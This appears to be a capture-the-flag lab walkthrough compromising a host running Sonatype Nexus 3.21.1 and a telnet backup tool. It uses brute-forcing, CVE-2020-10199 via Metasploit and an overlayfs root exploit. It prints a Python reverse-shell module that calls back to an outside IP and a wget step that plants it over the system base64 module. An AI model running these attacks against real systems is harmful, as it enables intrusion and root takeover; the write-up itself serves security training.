Reconnaissance

Performing an aggressive scan against the two TCP ports using the command sudo nmap -sV -A 192.168.136.159 -p 23,8081 returns the output shown above. The telnet application with the name NEXUS BACKUP MANAGER seems to be an interactive. It looks like the administrator uses this application to perform backups for the application Nexus, probably on port 8081. The web server on port 8081 is Jetty 9.4.18.v20190429. And this web application seems to be Nexus/3.21.1-01 according to the scan shown in the output above.

Enumeration

Port 8081: HTTP

The webpage above is returned for this web application on port 8081. The application name and version is Sonatype Nexus Repository Manager OSS 3.21.1-01 as shown in the image above. I enumerated the application, but I did not find anything useful. I performed a directory search, but it lead to nothing. I also tried to login using default standard credentials, but I had no luck either.


However, I notice the application is vulnerable to RCE. But this exploit requires authentication as shown in the image above. This vulnerability has the CVE ID of CVE-2020-10199. Time to enumerate the another port.

Port 23: Telnet

I connected to the terminal application on port 23 using nc. The command I used is nc 192.168.136.159 23. After connecting, I notice there are multiple commands that are executable. Two commands stand out to me: ANSONE and ANSTWO. When I ran the command HINT, it asks the questions: 1.What is your zodiac sign? and 2.What is your favorite color?. I could possibly bruteforce these. I ran the other commands, but it looks like I need the answers first.


I successfully bruteforced the question one. The answer is leo as shown in the image above. This took a while as the documentation was poor and the answers had to be in small-case. I tried to bruteforce in all cases.


And the answer for the second question is black as shown in the image above. Since these two are the answers, maybe I can perform more commands now.


I tried to recover the admin password first. To achieve this, I ran the command RECOVER and then the password blackleo and obtained the string 3e409e89-514c-4f9f-955e-dfa5c4083518. Is this the password for the web application on port 8081? Time to check it out. If the credentials work, I can use the exploit to gain Remote Code Execution (RCE) on the target machine.

Exploitation

Owning the Nexus 3.21.1 via RCE (CVE-2020-10199)

And it worked. Using the credentials admin:3e409e89-514c-4f9f-955e-dfa5c408351, I gained access to the Nexus application on this port as admin. Now I can perform further enumeration. But I did not find anything like sensitive files. Time to exploit the vulnerability.


I tried to use a public exploit found on Github, but I had no luck. I found the same exploit at Metasploit Framework with the name linux/http/nexus_repo_manager_el_injection. Then I set the parameters shown above for this exploit. These parameter names include PASSWORD, RHOSTS, USERNAME, LHOST, and LPORT. I also changed the payload to 13 (linux/x64/meterpreter_reverse_tcp), as the target machine is running Linux OS.


Then I ran the exploit using the command run and got a hit, as shown in the image above. Now I have a remote access on the target machine as the user nexus. Since the exploit session is via Metasploit, I will just use the multi/recon/local_exploit_suggester module to suggest any exploits.


Using the command use multi/recon/local_exploit_suggester, I set the session to one using the command set SESSION 1 as shown in the image above. And running it shows the target is vulnerable to exploit/linux/local/cve_2021_3493_overlayfs. Time to check it out.


I ran the command use exploit/linux/local/cve_2021_3493_overlayfs first. Then I initialised the session and host using the commands set SESSION 1 and set LHOST tun0. And running it using the command run landed me a root shel on the target machine.

Privilege Escalation

Horizontal Privilege Escalation: User nexus to User sona via Finding Password In File

Although I already obtained a root shell on the target machine using local_exploit_suggester module in Metasploit, I wish to perform privilege escalation manually too using a different vector. Previously, the exploit module exploited the Overlayfs. In this part, I wish to do it manually. There are two added users on the target machine: sona and nexus. When browsing through the files of the user nexus over at /home/nexus/nexus-3.21.1-01/system, I came across the file settings.xml. This file contains the username sona and password KuramaThe9. Using the command su sona and the new password KuramaThe9, I managed to successfully perform horizontal privilege escalation from user nexus to user sona, as shown in the image above.


Over at /home/sona/ directory, there is an interesting file with the name logcrypt.py with the content shown above. This Python file seems to be reading the /var/log/auth.log file in binary, and producing the output in base64 format. Then the output of the base64 is written to the log.crypt file over at /tmp. Hmmmm. I decoded the base64 output of log.crypt and obtained the following:

Vertical Privilege Escalation: User sona to User root via Python Module Hijacking of base64 Inside logcrypt.py


I transferred pspy64 to the target machine and executed it. After a while, I obtained the result shown above. It seems like the script logcrypt.py at /home/sona/ directory is being executed with root privileges. However, the Python source file is not writable. I cannot remove it either. But I could possibly perform module-hijacking as the module base64 is imported by the logcrypt.py file.

import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.45.206",8444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

import pty; pty.spawn("/bin/bash")
import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.45.206",8444));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

import pty; pty.spawn("/bin/bash")

On my machine, I created the Python script shown above. I saved the content to a file called base64.py. This will just invoke a reverse shell connection to my machine at port 8444. Then I transferred this to the exploited machine via Python http.server.


Running the command find / -name "base64.py" -ls 2>/dev/null to identify the base64 module shows the result in the image above. The location /usr/lib/python3.8/base64.py sounds interesting due to the /usr/lib/ prefix. Then I started a listener on my machine at port 8444.


To remove the existing module, I ran the command rm base64 over at /usr/lib/python3.8/. This ran successfully as I had the privileges to remove it. Then I downloaded the malicious base64.py that invokes a reverse shell connection to my machine at port 8444 using the command wget http://192.168.45.206:8080/base64.py at the same directory /usr/lib/python3.8/. Afterwards, I changed the permission of the malicious module to be executable using the command chmod +x base64.py as shown in the image above.


And after a while, I obtained a reverse shell connection on my port 8444 as shown in the image above. Now I have root access on the target machine manually.
